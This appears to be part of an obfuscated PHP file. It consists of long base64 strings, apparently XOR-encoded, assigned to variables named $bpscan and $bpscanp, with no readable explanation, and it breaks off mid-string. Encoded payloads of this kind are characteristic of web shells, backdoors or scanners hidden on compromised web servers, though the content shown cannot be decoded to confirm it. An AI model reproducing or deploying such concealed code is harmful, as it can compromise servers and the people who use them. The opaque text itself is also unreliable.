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";

$bpscan = 
"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";

$bpscanp =
"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